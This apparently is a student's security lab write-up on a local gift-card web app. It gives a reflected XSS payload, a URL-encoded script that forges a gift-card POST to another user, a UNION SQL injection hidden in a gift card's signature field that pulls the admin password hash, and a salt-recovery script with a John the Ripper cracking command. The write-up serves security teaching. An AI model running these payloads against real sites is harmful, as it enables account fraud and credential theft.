(1) The cross site scripting attack test case takes the form of a supplied URL (within "xss.txt") and exploits the vulnerable URL parameter "director":
---
127.0.0.1:8000/gift?director=<script>alert("Hello”)</script>
---
Within the template titled "gift.html" - we noticed that the URL parameter, "director", is vulnerable.
The reason behind this vulnerability is because auto-escaping has been turned off for the URL parameter "director" with the "safe" filter in gift.html.
This vulnerability can be found in line 60 of the given "gift.html" and the vulnerability starts with: <p>Endorsed by {{director|safe}}!</p>



-------------------------------------------------------------------------------------------------------------------------------------------------------



(2) This url link below with javascript embedded is for testing a link, which has someone gifting a card (amount=333) to someone (username=john) unintended.
This reference code below includes newlines between ";" for readability, please refer to "buy.txt" within this directory for the url link without newlines.
---
http://127.0.0.1:8000/gift?director=%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();
%20xhr.open(%22POST%22,%20%22/gift/1%22,%20true);
var%20data%20=%20new%20FormData();
%20data.append(%27username%27,%27john%27);
%20data.append(%27amount%27,333);
%20data.append(%27product%27,%20%271%27);
%20xhr.send(data);
%3C/script%3E
---
This URL link embeds javascript to the vulnerable url parameter for "director" and uses XMLhttprequest function to "POST" data rather than "GET" data.
This URL link will "POST" data when the link is clicked on, sending "FormData" to the webserver. 
This "FormData" includes a giftcard with the amount of 333 to the user john (unintended recipient);



-------------------------------------------------------------------------------------------------------------------------------------------------------



(3) this giftcard file contains SQL code within the dictionary data structure.
The SQL code is contained within the "signature" key of the dictionary, which is in the giftcard file.
The code (mixed with giftcard records data) below is found in the "salt.gftcrd" file, within this same directory.
---> scroll all the way to the right for complete SQL code --->
{"records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "{\"merchant_id\": \"NYU Apparel Card\", \"customer_id\": \"foo\", \"total_value\": \"111\", \"records\": [{\"record_type\": \"amount_change\", \"amount_added\": 2000, \"signature\": \"[ insert crypto signature here ]\"}]}'union select all group_concat(password) from LegacySite_user where username='admin"}]}
---> scroll all the way to the right for complete SQL code --->
This SQL code will "union" with the original SQL code at line 188 of the original "views.py" file given. 
This utilizes the vulnerable parameter, signature, within the variable "card_query" - because: %s was wrapped with quotes at line 188 of "card_query"



-------------------------------------------------------------------------------------------------------------------------------------------------------



(4) This test relies on the results from test 3 above and the hashed password displayed: 18821d89de11ab18488fdc0a01f1ddf4d290e198b0f80cd4974fc031dc2615a3
This test also relies on the same "RANDOM_SEED" value used for each registered user.
  -> Because the generator’s random() function will continue to produce the same sequence when the compatible seeder is given the same seed.
  -> And "RANDOM_SEED" with a value of "2RUHYAyJWdDdXOicZfnTRw==" is given to the random() function for every user registered.
  -> This will produce the same sequence for all users because of the same seed.
  -> Hence, all users passwords will be salted with the same value of 30930.
  
This python script below allowed us to find the salt value, used with sha256(). 
All the registered users on this website will have passwords salted with the value of 30930. We know this from this script below:
---
import random
import base64
from binascii import hexlify

length = 16
RANDOM_SEED = base64.b64decode("2RUHYAyJWdDdXOicZfnTRw==")
random.seed(RANDOM_SEED)
print(hexlify(random.randint(0, 2**length-1).to_bytes(length, byteorder='big')))
print(random.randint(0, 2**length-1))

# printed: salt (in bytes) from above w/ hexlify = b'000000000000000000000000000078d2'
# printed: salt (in base 10 form) is = 30930
---

If the salt, :, and hashed password (30930:18821d89de11ab18488fdc0a01f1ddf4d290e198b0f80cd4974fc031dc2615a3) are saved to a file called: toBrute.txt
Then, to decrypt from the commandline, attackers can run: ./john --format=Raw-SHA256 --salts=1 toBrute.txt
